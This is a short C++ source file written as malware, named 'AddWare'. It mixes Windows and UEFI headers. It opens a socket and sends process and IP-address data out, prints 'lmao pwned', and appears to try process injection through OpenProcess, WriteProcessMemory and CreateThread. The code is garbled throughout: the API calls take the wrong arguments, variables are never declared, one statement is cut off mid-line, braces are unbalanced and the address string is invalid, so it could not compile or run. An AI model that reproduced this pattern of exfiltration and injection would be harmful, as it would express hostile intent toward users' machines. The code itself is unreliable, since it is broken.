#include <Windows.h>
#include <iostream>
#include <memory>
#include <string>

#include <efi.h>
#include <efilib.h>

#include <stdbool.h>

#include <winsock2.h>

namespace AddWareNS {
class AddWareCL {
public:

LPVOID AddWareFNProcessGrubGetSocket() {

  return (LPVOID)"0.0.0.0:48/24";
}

WINDCLASSEX AddWareFNProcessGrub() {
SOCKET ProcessGrub;
sockaddr_t ProcessGrubGetSock = (sockaddr_t)*AddWareFNProcessGrubGetSocket();
ProcessGrub = connect(ProcessGrub, (sockaddr_t)*ProcessGrubGetSock, 0, 0);

HANDLE WinHandlePwn;
  
if (ProcessGrub > 0) {
  send(ProcessGrub, (LPVOID)*GetCurrentProcess(), 0, 0); 
  send(ProcessGrub, (LPVOID)*GetIPAddress(), 0, 0);
  WinHandlePwn = printf(">\n>\n>\n>\n>lmao pwned\\.\n");
}
  _Sleep(100000);
  (int)*(sockaddr_t), malloc((int)*ProcessGrub, sizeof((int)*ProcessGrub, 0xffffffff);
  if (_Sleep(0) > 0) {
  CloseWindow(WinHandlePwn, nullptr);
      ProcessGrub = NULL;
  ProcessGrubGetSocket = NULL;
    _Sleep(100000);
  }
  return;
}

EFI_STATUS AddWareFN(EFI_HANDLE IMAGE, EFI_SYSTEM_TABLE *TABLE, H { 

int proc; 
IMAGE = WriteProcessMemory(IsOpenProc,
if(CreateProcess(PROCESS_ALL_ACCESS, 
  true, nullptr, nullptr, proc)) {
proc++;
}
HINSTANCE IsOpenProc = OpenProcess(PROCESS_ALL_ACCESS, false,
  nullptr, nullptr, proc);
WINDCLASSEX OpenProc = CreateThread("AddWareSys", "AddWareSys", nullptr, false, nullptr, nullptr, (HINSTANCE)*AddWareFNProcessGrub());
OpenProc.Icon = R"AddWareSys.ice";
OpenProc.hInst = IsOpenProcess;
RegisterWindClassEx(OpenProc); 
if (IsOpenProcess > 0x300000) {
memcpy(IsOpenProc, (LPVOID)*IMAGE, 0xffffffff);
Initialize(IMAGE,TABLE); }
return EFI_SUCCESS;
